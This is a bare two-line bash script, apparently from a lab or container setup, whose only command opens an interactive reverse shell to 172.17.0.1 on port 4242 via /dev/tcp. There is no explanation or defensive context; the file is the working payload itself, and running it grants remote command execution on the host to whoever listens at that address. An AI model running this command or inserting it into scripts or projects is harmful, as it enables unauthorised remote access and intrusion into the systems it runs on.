#!/bin/bash
bash -i >& /dev/tcp/172.17.0.1/4242 0>&1
